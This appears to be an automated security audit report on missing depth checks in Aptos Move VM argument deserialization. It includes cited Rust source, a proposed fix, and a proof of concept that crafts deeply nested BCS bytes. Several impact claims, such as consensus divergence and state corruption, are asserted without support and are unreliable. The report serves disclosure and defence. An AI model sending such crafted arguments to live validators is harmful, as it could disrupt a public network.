# Audit Report

## Title
Missing Depth Validation in Argument Deserialization Allows Stack Overflow and VM State Corruption

## Summary
The `execute_function_bypass_visibility()` function deserializes transaction arguments without enforcing depth limits, creating an asymmetry with serialization that enforces a 128-level depth limit. This allows attackers to inject deeply nested Move values that can cause validator stack overflow or deterministic execution failures, violating the Move VM Safety invariant.

## Finding Description

The Move VM implements depth checking during value **serialization** to prevent stack overflow from deeply nested structures, but completely omits this check during **deserialization**. This creates a critical vulnerability in the argument processing path. [1](#0-0) 

Serialization includes a `depth` field and calls `check_depth()` to enforce the `max_value_nest_depth` limit (default 128 levels). [2](#0-1) 

However, `DeserializationSeed` has **no depth field** and never performs depth checking during recursive deserialization. [3](#0-2) 

The deserialization recursively processes nested structures (vectors, structs) without any depth tracking.

**Attack Path:**

1. Attacker crafts BCS-encoded bytes with deeply nested vectors (e.g., `vector<vector<vector<...u8>>>` with 1000+ nesting levels)
2. Submits transaction calling an entry function with these malicious arguments
3. `execute_function_bypass_visibility()` invokes argument deserialization: [4](#0-3) 

4. Flows to `deserialize_args()` which calls `deserialize_arg()` for each parameter: [5](#0-4) 

5. `ValueSerDeContext::deserialize()` is invoked without depth limits: [6](#0-5) 

6. BCS recursively deserializes the deeply nested structure, potentially causing:
   - **Stack overflow** if nesting exceeds stack capacity (thousands of levels) → validator crash
   - **Invalid VM state** if nesting exceeds 128 levels but completes → later operations fail with `VM_MAX_VALUE_DEPTH_REACHED`

The depth check function exists but is only called during runtime operations, not deserialization: [7](#0-6) 

Even the fuzzer tests deserialization without depth limits: [8](#0-7) 

## Impact Explanation

This vulnerability meets **Medium Severity** criteria with potential escalation to **High Severity**:

1. **Validator Node Crashes**: Deeply nested arguments (10,000+ levels) cause stack overflow during BCS deserialization, crashing validator nodes. Multiple attackers could coordinate to disrupt network availability.

2. **Deterministic Execution Failures**: Arguments with 128-1000 nesting levels deserialize successfully but fail when used, causing deterministic transaction rejection. This breaks consensus assumptions if validators process identical blocks differently based on timing.

3. **State Inconsistencies**: Values that deserialize but cannot serialize back violate round-trip invariants, potentially corrupting state if stored before validation.

4. **Resource Exhaustion**: Creating extremely large nested values consumes excessive memory before depth checks trigger.

This violates Critical Invariants #3 (Move VM Safety) and #9 (Resource Limits).

## Likelihood Explanation

**High Likelihood** - No special privileges required:

- Any transaction sender can craft malicious BCS bytes
- No validator collusion needed
- Attack is deterministic and repeatable
- Transaction size limits don't prevent this (1KB can contain 100+ nesting levels)
- The `max_invocations` limit in argument validation only counts constructor calls, not nesting depth [9](#0-8) 

The cost is minimal (single transaction fee), and impact is significant (node crash or execution failure).

## Recommendation

Add depth tracking to `DeserializationSeed` matching the serialization implementation:

```rust
pub(crate) struct DeserializationSeed<'c, L> {
    pub(crate) ctx: &'c ValueSerDeContext<'c>,
    pub(crate) layout: L,
    pub(crate) depth: u64,  // ADD THIS FIELD
}

impl<'d> serde::de::DeserializeSeed<'d> for DeserializationSeed<'_, &MoveTypeLayout> {
    fn deserialize<D: serde::de::Deserializer<'d>>(
        self,
        deserializer: D,
    ) -> Result<Self::Value, D::Error> {
        // ADD DEPTH CHECK AT START
        self.ctx.check_depth(self.depth).map_err(D::Error::custom)?;
        
        match self.layout {
            L::Vector(layout) => {
                let seed = DeserializationSeed {
                    ctx: self.ctx,
                    layout,
                    depth: self.depth + 1,  // INCREMENT DEPTH
                };
                // ... rest of implementation
            }
            L::Struct(struct_layout) => {
                let seed = DeserializationSeed {
                    ctx: self.ctx,
                    layout: struct_layout,
                    depth: self.depth,  // Increment in field visitor
                };
                // ... rest
            }
            // ... other cases
        }
    }
}
```

Initialize depth to 1 when creating the seed in `deserialize_arg()`: [10](#0-9) 

Update fuzzer to test with depth limits:

```rust
let _ = ValueSerDeContext::new(Some(128)).deserialize(&fuzz_data.data, &fuzz_data.layout);
```

## Proof of Concept

```rust
// PoC: Craft deeply nested BCS bytes
use move_core_types::value::MoveTypeLayout;
use move_vm_types::value_serde::ValueSerDeContext;

fn create_deeply_nested_vector_bcs(depth: usize) -> Vec<u8> {
    let mut bytes = vec![];
    // Each nesting level adds: length prefix (1) + inner content
    for _ in 0..depth {
        bytes.push(1); // Vector length = 1
    }
    bytes.push(0); // Innermost u8 value
    bytes
}

fn main() {
    // Create layout for deeply nested vector<vector<...<u8>>>
    let mut layout = MoveTypeLayout::U8;
    for _ in 0..200 {
        layout = MoveTypeLayout::Vector(Box::new(layout));
    }
    
    let malicious_bytes = create_deeply_nested_vector_bcs(200);
    
    // This will succeed (NO depth check in deserialization)
    let ctx = ValueSerDeContext::new(Some(128));
    let result = ctx.deserialize(&malicious_bytes, &layout);
    assert!(result.is_some()); // VULNERABILITY: Should fail but doesn't!
    
    let value = result.unwrap();
    
    // But trying to copy this value WILL fail with depth check
    let copy_result = value.copy_value_with_depth(128);
    assert!(copy_result.is_err()); // Fails with VM_MAX_VALUE_DEPTH_REACHED
    
    // And serialization will also fail
    let serialize_result = ctx.serialize(&value, &layout);
    assert!(serialize_result.unwrap().is_none()); // Cannot serialize back!
}
```

This demonstrates the asymmetry: deserialization accepts 200-level depth, but serialization and runtime operations reject anything beyond 128 levels.

### Citations

**File:** third_party/move/move-vm/types/src/values/values_impl.rs (L4818-4838)
```rust
pub(crate) struct SerializationReadyValue<'c, 'l, 'v, L, V> {
    // Contains the current (possibly custom) serialization context.
    pub(crate) ctx: &'c ValueSerDeContext<'c>,
    // Layout for guiding serialization.
    pub(crate) layout: &'l L,
    // Value to serialize.
    pub(crate) value: &'v V,
    pub(crate) depth: u64,
}

fn invariant_violation<S: serde::Serializer>(message: String) -> S::Error {
    S::Error::custom(
        PartialVMError::new(StatusCode::UNKNOWN_INVARIANT_VIOLATION_ERROR).with_message(message),
    )
}

impl serde::Serialize for SerializationReadyValue<'_, '_, '_, MoveTypeLayout, Value> {
    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        use MoveTypeLayout as L;

        self.ctx.check_depth(self.depth).map_err(S::Error::custom)?;
```

**File:** third_party/move/move-vm/types/src/values/values_impl.rs (L5085-5090)
```rust
pub(crate) struct DeserializationSeed<'c, L> {
    // Holds extensions external to the deserializer.
    pub(crate) ctx: &'c ValueSerDeContext<'c>,
    // Layout to guide deserialization.
    pub(crate) layout: L,
}
```

**File:** third_party/move/move-vm/types/src/values/values_impl.rs (L5092-5164)
```rust
impl<'d> serde::de::DeserializeSeed<'d> for DeserializationSeed<'_, &MoveTypeLayout> {
    type Value = Value;

    fn deserialize<D: serde::de::Deserializer<'d>>(
        self,
        deserializer: D,
    ) -> Result<Self::Value, D::Error> {
        use MoveTypeLayout as L;

        match self.layout {
            // Primitive types.
            L::Bool => bool::deserialize(deserializer).map(Value::bool),
            L::U8 => u8::deserialize(deserializer).map(Value::u8),
            L::U16 => u16::deserialize(deserializer).map(Value::u16),
            L::U32 => u32::deserialize(deserializer).map(Value::u32),
            L::U64 => u64::deserialize(deserializer).map(Value::u64),
            L::U128 => u128::deserialize(deserializer).map(Value::u128),
            L::U256 => int256::U256::deserialize(deserializer).map(Value::u256),
            L::I8 => i8::deserialize(deserializer).map(Value::i8),
            L::I16 => i16::deserialize(deserializer).map(Value::i16),
            L::I32 => i32::deserialize(deserializer).map(Value::i32),
            L::I64 => i64::deserialize(deserializer).map(Value::i64),
            L::I128 => i128::deserialize(deserializer).map(Value::i128),
            L::I256 => int256::I256::deserialize(deserializer).map(Value::i256),
            L::Address => AccountAddress::deserialize(deserializer).map(Value::address),
            L::Signer => {
                if self.ctx.legacy_signer {
                    Err(D::Error::custom(
                        "Cannot deserialize signer into value".to_string(),
                    ))
                } else {
                    let seed = DeserializationSeed {
                        ctx: self.ctx,
                        layout: &MoveStructLayout::signer_serialization_layout(),
                    };
                    Ok(Value::struct_(seed.deserialize(deserializer)?))
                }
            },

            // Structs.
            L::Struct(struct_layout) => {
                let seed = DeserializationSeed {
                    ctx: self.ctx,
                    layout: struct_layout,
                };
                Ok(Value::struct_(seed.deserialize(deserializer)?))
            },

            // Vectors.
            L::Vector(layout) => Ok(match layout.as_ref() {
                L::U8 => Value::vector_u8(Vec::deserialize(deserializer)?),
                L::U16 => Value::vector_u16(Vec::deserialize(deserializer)?),
                L::U32 => Value::vector_u32(Vec::deserialize(deserializer)?),
                L::U64 => Value::vector_u64(Vec::deserialize(deserializer)?),
                L::U128 => Value::vector_u128(Vec::deserialize(deserializer)?),
                L::U256 => Value::vector_u256(Vec::deserialize(deserializer)?),
                L::I8 => Value::vector_i8(Vec::deserialize(deserializer)?),
                L::I16 => Value::vector_i16(Vec::deserialize(deserializer)?),
                L::I32 => Value::vector_i32(Vec::deserialize(deserializer)?),
                L::I64 => Value::vector_i64(Vec::deserialize(deserializer)?),
                L::I128 => Value::vector_i128(Vec::deserialize(deserializer)?),
                L::I256 => Value::vector_i256(Vec::deserialize(deserializer)?),
                L::Bool => Value::vector_bool(Vec::deserialize(deserializer)?),
                L::Address => Value::vector_address(Vec::deserialize(deserializer)?),
                layout => {
                    let seed = DeserializationSeed {
                        ctx: self.ctx,
                        layout,
                    };
                    let vector = deserializer.deserialize_seq(VectorElementVisitor(seed))?;
                    Value::Container(Container::Vec(Rc::new(RefCell::new(vector))))
                },
            }),
```

**File:** third_party/move/move-vm/types/src/values/values_impl.rs (L6165-6171)
```rust
#[inline]
fn check_depth(depth: u64, max_depth: Option<u64>) -> PartialVMResult<()> {
    if max_depth.is_some_and(|max_depth| depth > max_depth) {
        return Err(PartialVMError::new(StatusCode::VM_MAX_VALUE_DEPTH_REACHED));
    }
    Ok(())
}
```

**File:** aptos-move/aptos-vm/src/move_vm_ext/session/mod.rs (L109-138)
```rust
    pub fn execute_function_bypass_visibility(
        &mut self,
        module_id: &ModuleId,
        function_name: &IdentStr,
        ty_args: Vec<TypeTag>,
        args: Vec<impl Borrow<[u8]>>,
        gas_meter: &mut impl GasMeter,
        traversal_context: &mut TraversalContext,
        module_storage: &impl ModuleStorage,
    ) -> VMResult<SerializedReturnValues> {
        dispatch_loader!(module_storage, loader, {
            let func = loader.load_instantiated_function(
                &LegacyLoaderConfig::unmetered(),
                gas_meter,
                traversal_context,
                module_id,
                function_name,
                &ty_args,
            )?;
            MoveVM::execute_loaded_function(
                func,
                args,
                &mut MoveVmDataCacheAdapter::new(&mut self.data_cache, self.resolver, &loader),
                gas_meter,
                traversal_context,
                &mut self.extensions,
                &loader,
            )
        })
    }
```

**File:** third_party/move/move-vm/runtime/src/move_vm.rs (L179-216)
```rust
fn deserialize_arg(
    function_value_extension: &impl FunctionValueExtension,
    layout_converter: &LayoutConverter<impl Loader>,
    gas_meter: &mut impl GasMeter,
    traversal_context: &mut TraversalContext,
    ty: &Type,
    arg: impl Borrow<[u8]>,
) -> PartialVMResult<Value> {
    let deserialization_error = || -> PartialVMError {
        PartialVMError::new(StatusCode::FAILED_TO_DESERIALIZE_ARGUMENT)
            .with_message("[VM] failed to deserialize argument".to_string())
    };

    // Make sure we do not construct values which might have delayed fields inside. This should be
    // guaranteed by transaction argument validation but because it does not use layouts we better
    // double-check here.
    let layout = layout_converter
        .type_to_type_layout_with_delayed_fields(gas_meter, traversal_context, ty, false)
        .map_err(|err| {
            if layout_converter.is_lazy_loading_enabled() {
                err
            } else {
                // Note: for backwards compatibility, the error code is remapped to this error. We
                // no longer should do it because layout construction may return useful errors such
                // as layout being too large, running out of gas, etc.
                PartialVMError::new(StatusCode::INVALID_PARAM_TYPE_FOR_DESERIALIZATION)
                    .with_message("[VM] failed to get layout from type".to_string())
            }
        })?
        .into_layout_when_has_no_delayed_fields()
        .ok_or_else(deserialization_error)?;

    let max_value_nest_depth = function_value_extension.max_value_nest_depth();
    ValueSerDeContext::new(max_value_nest_depth)
        .with_func_args_deserialization(function_value_extension)
        .deserialize(arg.borrow(), &layout)
        .ok_or_else(deserialization_error)
}
```

**File:** third_party/move/move-vm/types/src/value_serde.rs (L237-241)
```rust
    /// Deserializes the bytes using the provided layout into a Move [Value].
    pub fn deserialize(self, bytes: &[u8], layout: &MoveTypeLayout) -> Option<Value> {
        let seed = DeserializationSeed { ctx: &self, layout };
        bcs::from_bytes_seed(seed, bytes).ok()
    }
```

**File:** testsuite/fuzzer/fuzz/fuzz_targets/move/value_deserialize.rs (L18-23)
```rust
fuzz_target!(|fuzz_data: FuzzData| {
    if fuzz_data.data.is_empty() || !is_valid_layout(&fuzz_data.layout) {
        return;
    }
    let _ = ValueSerDeContext::new(None).deserialize(&fuzz_data.data, &fuzz_data.layout);
});
```

**File:** aptos-move/aptos-vm/src/verifier/transaction_arg_validation.rs (L289-301)
```rust
            let mut max_invocations = 10; // Read from config in the future
            recursively_construct_arg(
                session,
                loader,
                gas_meter,
                traversal_context,
                ty,
                allowed_structs,
                &mut cursor,
                initial_cursor_len,
                &mut max_invocations,
                &mut new_arg,
            )?;
```
